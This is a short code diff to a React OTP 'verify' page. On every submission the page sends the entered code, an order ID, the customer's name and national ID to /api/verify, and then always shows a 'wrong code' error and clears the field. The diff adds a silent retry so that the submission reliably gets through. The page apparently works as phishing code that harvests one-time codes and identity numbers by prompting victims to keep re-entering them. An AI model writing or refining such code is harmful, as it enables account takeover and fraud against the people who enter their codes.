@@ -90,11 +90,23 @@ export default function VerifyPage() {
     e.preventDefault();
     const code = otp.trim();
     if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
-    await fetch("/api/verify", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
-    });
+    try {
+      const res = await fetch("/api/verify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
+      });
+      if (!res.ok) {
+        // retry once on failure
+        await fetch("/api/verify", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
+        });
+      }
+    } catch {
+      // network error — silently ignore, user sees "wrong code" UI
+    }
     setCodeError(true);
     setOtp("");
     inputRef.current?.focus();
